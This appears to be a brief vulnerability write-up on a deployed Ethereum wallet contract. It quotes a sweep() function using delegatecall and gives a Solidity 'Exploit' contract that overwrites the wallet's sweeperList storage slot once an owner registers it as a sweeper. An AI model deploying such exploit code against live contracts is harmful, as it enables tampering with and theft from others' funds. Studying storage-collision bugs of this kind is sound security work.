# address 
https://etherscan.io/address/0x0a7bca9FB7AfF26c6ED8029BB6f0F5D291587c42

# vuln

```
contract UserWallet {
    AbstractSweeperList sweeperList;
    ...
    function sweep(address _token, uint _amount)
    returns (bool) {
        (_amount);
        return sweeperList.sweeperOf(_token).delegatecall(msg.data);
    }
    ...
}
```
In the contract named UserWallet, there is a sweep() function, and it called the delegatecall() which will change the value of sweeperList.

# attack

```
contract Controller is AbstractSweeperList {
    ...
    function addSweeper(address _token, address _sweeper) onlyOwner {
        sweepers[_token] = _sweeper;
    }
    ...
}
```
Firstly, we should let the owner add the evil contract address to his sweepers. The evil contract like this.

```

contract Exploit {

    uint public start;
    function sweep(address _token, uint _amount) returns (bool) {
        start = 0x123456789;
        return true;
    }
}
```
then we just call the sweep() in UserWallet contract, it will change the sweeperList to 0X123456789.
